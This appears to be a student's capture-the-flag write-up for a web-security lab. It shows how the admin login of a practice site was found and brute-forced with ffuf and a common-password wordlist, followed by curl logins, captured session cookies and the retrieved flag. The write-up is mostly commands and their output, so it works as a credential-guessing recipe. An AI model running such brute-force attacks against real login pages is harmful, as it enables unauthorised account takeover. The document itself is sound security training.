# 1. Password Attacks

**Objective**:

Find weak passwords using brute-forcing and default credentials.

Do:

1. Use ffuf to brute-force the password of admin
2. OR identify and exploit default credentials in the system
3. Login with the found credentials to get the flag

Repo:

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x0B_WEBSEC`
- File: `1-flag.txt`


## Step 1: Find the Login Endpoint

Before `ffuf` we need to find:
- where the login endpoint is
- what a failed login looks like

We know that `admin` exists. Let's try several endpoints, like: `/api/login`, `/api/auth`, `/login`, `/api/signin`, ...

```bash

# /api/login

curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"
# <!doctype html>
# <html lang=en>
# <title>404 Not Found</title>
# <h1>Not Found</h1>
# <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
# 
# [404]
# 


# /api/auth
curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"

# <title>404 Not Found</title>
# <h1>Not Found</h1>
#
# [404]


# /login

curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"

# SecureCorp login page 

# [400]

```

We found endpoint `/login` and wrong password returns status code 400.

## Side Step: Mimicking Browser Requests

> We just realized that when clicking the login button on the webpage, it diverts us to url  \
[https://web-80-47-145.cod-eu-west-3.hbtn.io/login](https://web-80-47-145.cod-eu-west-3.hbtn.io/login)  \
and the login sends a POST request to `/login` with `Content-Type: application/x-www-form-urlencoded` and not `application/json`. This is a common mistake when testing APIs, we should always try to mimic the real requests as closely as possible.

### Traces from Mozilla Firefox Developer Tools

```html
POST
	https://web-80-47-145.cod-eu-west-3.hbtn.io/login
scheme
	https
host
	web-80-47-145.cod-eu-west-3.hbtn.io
filename
	/login
```

```http
Status
302
FOUND
VersionHTTP/1.1
Transferred5.50 kB (0 B size)
Referrer Policystrict-origin-when-cross-origin
Request PriorityHighest
DNS ResolutionSystem
```

#### Request Headers

```http
POST /login HTTP/1.1
Host: web-80-47-145.cod-eu-west-3.hbtn.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://web-80-47-145.cod-eu-west-3.hbtn.io
Connection: keep-alive
Referer: https://web-80-47-145.cod-eu-west-3.hbtn.io/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```

#### Response Headers

```http
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 01 Jun 2026 10:42:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: keep-alive
Location: /dashboard
Vary: Cookie
Set-Cookie: session=.eJyFjcEKgkAURX_l9dYSzagTzE7MNhUFuQuRp_PGBDVwciX-e1MtWra693IPnBlL25G7s0N9mxGePtBNdc3OYYB5cj2AhPR8uhyzPNutIDF9OwB9AGioHdisYd9Ro0GEKtyQIcERm1hWMStVWRlZJayhrcViKQL0uqaUqPEvHuD46NiT9Hb6OTkey9agFt8-UP-7lxeZ5D36.ah1iMA.T_Y8tX-A-ECoMf1iajJF7ADliPU; Path=/
```


## Fuzzing inspired by browser login, status code 302 ok

From browser login, we see that a successful login returns status code 302 and not 400. Let's use that in our `ffuf` command (-mc 302) to find the correct password.

```bash
ffuf \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -mc 302 \
  -k


#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/login
#  :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
#  :: Header           : Content-Type: application/x-www-form-urlencoded
#  :: Data             : username=admin&password=FUZZ
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 302
# ________________________________________________
# 
# password                [Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 866ms]
# :: Progress: [10000/10000] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:07] :: Errors: 0 ::
#
# ┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]

```



## Trying the admin:password combination:

```bash
curl -i -s -k \
  -c cookies.txt \                                             
  -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password"    

# HTTP/1.1 302 FOUND
# Server: nginx/1.18.0 (Ubuntu)
# Date: Sun, 31 May 2026 21:27:43 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 207
# Connection: keep-alive
# Location: /dashboard
# Vary: Cookie
# Set-Cookie: session=.eJyFjcEKgkAURX_l9dYSzagTzE7MNhUFuQuRp_PGBDVwciX-e1MtWra693IPnBlL25G7s0N9mxGePtBNdc3OYYB5cj2AhPR8uhyzPNutIDF9OwB9AGioHdisYd9Ro0GEKtyQIcERm1hWMStVWRlZJayhrcViKQL0uqaUqPEvHuD46NiT9Hb6OTkey9agFt8-UP-7lxeZ5D36.ahynzw.PpeLLg7o1v719NYLAlI7J1RGXa4; Path=/

# <!doctype html>
# <html lang=en>
# <title>Redirecting...</title>
# <h1>Redirecting...</h1>
# <p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.

```

## Catching the Flag

```bash
curl -s -k \   
  -b cookies.txt \                                             
  "https://web-80-47-145.cod-eu-west-3.hbtn.io/dashboard" \    
  | grep -iE 'flag|holberton|hbtn'

#                <p class="text-sm font-medium">TASK 2 COMPLETED! Admin access gained. Flag: 13630ada1e4ed52b5e66bf24f61fda7f</p>
#                                Complete the assigned tasks to uncover flags. Flags will appear here once you
#                <!-- Flags Section -->
#                    <!-- Task 1 Flag (Assumed handled elsewhere or just not shown in original, adding placeholder layout if variables exist) -->
#                    <!-- The original dashboard showed flag_2, flag_3, flag_4 -->
#                                        <span class="font-bold mr-2">Flag:</span>

```

## Saving the Flag into `1-flag.txt`

```bash
echo 13630ada1e4ed52b5e66bf24f61fda7f > 1-flag.txt

#┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]
#└─$ 
cat 1-flag.txt                                                             
# 13630ada1e4ed52b5e66bf24f61fda7f

```

## `ffuf` -of json

```bash

ffuf \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -mc 302 \
  -k \
  -of json \
  -o admin-pass.json



#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/login
#  :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
#  :: Header           : Content-Type: application/x-www-form-urlencoded
#  :: Data             : username=admin&password=FUZZ
#  :: Output file      : admin-pass.json
#  :: File format      : json
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 302
# ________________________________________________
# 
# password                [Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 1591ms]
# :: Progress: [10000/10000] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:05] :: Errors: 0 ::




# Extract psw

#┌──(kali㉿kali)-[~/dlh-cyber_security/web_application_security/0x0B_WEBSEC]
#└─$ 
jq -r '.results[].input.FUZZ' admin-pass.json
# password
```